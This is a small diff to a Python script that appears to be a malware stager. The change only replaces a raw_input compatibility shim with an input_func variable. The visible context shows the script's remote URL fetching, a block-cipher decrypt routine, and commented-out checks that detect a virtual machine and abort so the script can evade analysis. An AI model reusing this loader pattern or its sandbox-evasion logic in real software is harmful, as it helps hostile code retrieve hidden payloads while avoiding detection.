@@ -9,13 +9,10 @@ import struct
 import base64
 if sys.version_info[0] > 2:
     from urllib.request import urlopen
+    input_func = input
 else:
     from urllib import urlopen
-
-try:
-    raw_input          # Python 2
-except NameError:
-    raw_input = input  # Python 3
+    input_func = raw_input
 
 # main
 def decrypt(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
@@ -47,7 +44,7 @@ def run(url=None, key=None):
     if url:
         # if environment():
             # if '--debug' in sys.argv:
-            #     if raw_input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
+            #     if input_func("Virtual machine detected. Abort? (y/n): ").startswith('y'):
             #         sys.exit(0)
             # else:
             #     sys.exit(0)
